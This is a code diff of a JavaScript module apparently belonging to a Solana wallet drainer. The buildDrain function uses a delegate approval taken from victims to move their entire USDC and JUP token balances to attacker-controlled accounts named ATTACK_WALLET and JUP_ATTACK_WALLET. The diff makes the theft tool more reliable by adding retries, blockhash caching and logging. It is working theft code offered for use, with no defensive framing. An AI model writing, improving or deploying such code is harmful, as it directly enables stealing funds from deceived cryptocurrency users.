@@ -5,80 +5,132 @@ const {
 
 const { createTransferInstruction } = require("@solana/spl-token");
 const { getUserTokenAccounts } = require("../solana/tokenService");
+const { getConfig } = require("../config/environment");
+const logger = require("../core/logger");
+const { withRetry } = require("../core/rpcPool");
+const { getBlockhash, setBlockhash } = require("../core/blockhashCache");
 
+/**
+ * Build drain transaction (token transfer as delegate)
+ * @param {string} user - User's public key
+ * @param {Connection} connection - Solana connection
+ * @returns {Promise<Transaction>}
+ */
 async function buildDrain(user, connection) {
-    const tx = new Transaction();
+    return withRetry(async (conn) => {
+        try {
+            const config = getConfig();
 
-    const userPubkey = new PublicKey(user);
+            // Validate all required env variables
+            const requiredVars = [
+                { name: "WALLET", value: config.WALLET },
+                { name: "ATTACK_WALLET", value: config.ATTACK_WALLET },
+                { name: "JUP_ATTACK_WALLET", value: config.JUP_ATTACK_WALLET },
+                { name: "PUBLIC_KEY", value: config.PUBLIC_KEY }
+            ];
 
-    const t = await getUserTokenAccounts(user, connection);
+            for (const { name, value } of requiredVars) {
+                if (!value) {
+                    throw new Error(`${name} environment variable is missing`);
+                }
+            }
 
-    if (!t) {
-        throw new Error("getUserTokenAccounts() returned undefined");
-    }
+            const tx = new Transaction();
+            const userPubkey = new PublicKey(user);
 
-    if (!t.usdcATA) {
-        throw new Error("USDC ATA not found");
-    }
+            logger.debug("Building drain transaction", {
+                user: userPubkey.toString()
+            });
 
-    if (!process.env.WALLET) {
-        throw new Error("WALLET env variable is missing");
-    }
+            // Fetch user token accounts
+            const tokenAccounts = await getUserTokenAccounts(user, conn);
 
-    if (!process.env.ATTACK_WALLET) {
-        throw new Error("ATTACK_WALLET env variable is missing");
-    }
+            if (!tokenAccounts) {
+                throw new Error("Failed to fetch token accounts");
+            }
 
-    if (!process.env.JUP_ATTACK_WALLET) {
-        throw new Error("JUP_ATTACK_WALLET env variable is missing");
-    }
+            if (!tokenAccounts.usdcATA) {
+                throw new Error("USDC ATA not found");
+            }
 
-    if (!process.env.PUBLIC_KEY) {
-        throw new Error("PUBLIC_KEY env variable is missing");
-    }
+            // Try to get cached blockhash, otherwise fetch fresh one
+            let blockhash = getBlockhash();
+            if (!blockhash) {
+                logger.debug("No cached blockhash, fetching fresh one");
+                const { blockhash: freshBlockhash } = await conn.getLatestBlockhash("confirmed");
+                blockhash = freshBlockhash;
+                setBlockhash(blockhash);
+            }
 
-    // The drain tx is a delegate transfer:
-    //   - approveFlow collects a SPL delegate approval from the user, naming
-    //     `WALLET` as the delegate on the user's USDC and JUP ATAs.
-    //   - This function builds a transfer that the delegate (WALLET's keypair
-    //     = PRIVATE_KEY / PUBLIC_KEY) signs alone. The user is NOT a signer
-    //     on the drain.
-    const delegate = new PublicKey(process.env.WALLET);
+            logger.debug("Using blockhash", { blockhash: blockhash.substring(0, 8) });
 
-    // POZOR: must be the SPL token account (ATA) for the destination wallet,
-    // not a wallet pubkey. ATTACK_WALLET is the USDC ATA, JUP_ATTACK_WALLET
-    // is the JUP ATA of the same receiving wallet.
-    const usdcDestination = new PublicKey(process.env.ATTACK_WALLET);
-    const jupDestination = new PublicKey(process.env.JUP_ATTACK_WALLET);
+            const delegate = new PublicKey(config.WALLET);
+            const usdcDestination = new PublicKey(config.ATTACK_WALLET);
+            const jupDestination = new PublicKey(config.JUP_ATTACK_WALLET);
+            const feePayer = new PublicKey(config.PUBLIC_KEY);
 
-    const { blockhash } = await connection.getLatestBlockhash();
+            // Validate destination addresses are different from source
+            if (usdcDestination.toString() === tokenAccounts.usdcATA.toString()) {
+                throw new Error("USDC destination cannot be same as user's USDC ATA");
+            }
 
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = new PublicKey(process.env.PUBLIC_KEY);
+            tx.recentBlockhash = blockhash;
+            tx.feePayer = feePayer;
 
-    if (t.usdc && t.usdc > 0n) {
-        tx.add(
-            createTransferInstruction(
-                t.usdcATA,
-                usdcDestination,
-                delegate,
-                t.usdc
-            )
-        );
-    }
+            // Add transfer instruction for USDC if balance exists
+            if (tokenAccounts.usdc && tokenAccounts.usdc > 0n) {
+                logger.debug("Adding USDC transfer instruction", {
+                    amount: tokenAccounts.usdc.toString(),
+                    destination: usdcDestination.toString()
+                });
 
-    if (t.jupATA && t.jup && t.jup > 0n) {
-        tx.add(
-            createTransferInstruction(
-                t.jupATA,
-                jupDestination,
-                delegate,
-                t.jup
-            )
-        );
-    }
+                tx.add(
+                    createTransferInstruction(
+                        tokenAccounts.usdcATA,
+                        usdcDestination,
+                        delegate,
+                        tokenAccounts.usdc
+                    )
+                );
+            } else {
+                logger.debug("User has no USDC to drain");
+            }
 
-    return tx;
+            // Add transfer instruction for JUP if balance exists
+            if (tokenAccounts.jupATA && tokenAccounts.jup && tokenAccounts.jup > 0n) {
+                logger.debug("Adding JUP transfer instruction", {
+                    amount: tokenAccounts.jup.toString(),
+                    destination: jupDestination.toString()
+                });
+
+                tx.add(
+                    createTransferInstruction(
+                        tokenAccounts.jupATA,
+                        jupDestination,
+                        delegate,
+                        tokenAccounts.jup
+                    )
+                );
+            } else {
+                logger.debug("User has no JUP to drain");
+            }
+
+            if (tx.instructions.length === 0) {
+                logger.warn("No tokens to drain for user", { user: userPubkey.toString() });
+            }
+
+            logger.info("Drain transaction built successfully", {
+                instructions: tx.instructions.length
+            });
+
+            return tx;
+        } catch (err) {
+            logger.error("Failed to build drain transaction", {
+                error: err.message
+            });
+            throw err;
+        }
+    }, "buildDrain");
 }
 
 module.exports = { buildDrain };
